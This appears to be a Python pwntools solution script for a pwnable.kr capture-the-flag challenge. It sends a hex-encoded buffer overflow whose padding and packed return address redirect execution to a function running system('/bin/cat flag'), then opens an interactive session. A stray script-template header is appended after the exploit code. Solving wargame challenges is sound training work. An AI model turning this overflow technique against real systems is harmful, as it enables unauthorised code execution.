from pwn import *

r = remote('pwnable.kr', 9015)
r.recvuntil('payload please : ')

print "Connected!"

win = 0x4005F4 # system(/bin/cat flag)
payload = (0x38)*'B' +  p64(win) + '\x0a'
padding = 4093*'A' # for damn pipe buffer..

#gdb.attach(r, 'b *(main+84)')
show = "-1\n" + padding + payload + '\x0a'
r.send(show.encode('hex'))

r.interactive()
#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports


